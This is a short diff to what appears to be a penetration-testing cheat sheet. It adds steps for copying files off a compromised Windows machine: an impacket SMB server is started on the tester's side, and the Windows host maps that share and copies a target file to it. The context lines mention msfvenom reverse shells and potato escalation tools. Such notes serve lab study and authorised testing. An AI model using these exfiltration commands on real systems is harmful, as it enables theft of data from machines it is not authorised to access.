@@ -3514,3 +3514,14 @@ first use msfvenom to generate rev.exe and get it on the machine
 ```
 
 Other compiled potatos available at SharpCollection
+
+Use SMB to transfer files off windows
+```
+impacket-smbserver -smb2support share . -username abc -password abc
+```
+
+on winowds
+```
+net use Y: \\192.168.45.184\share /user:abc abc
+cp target_file.json Y:
+```
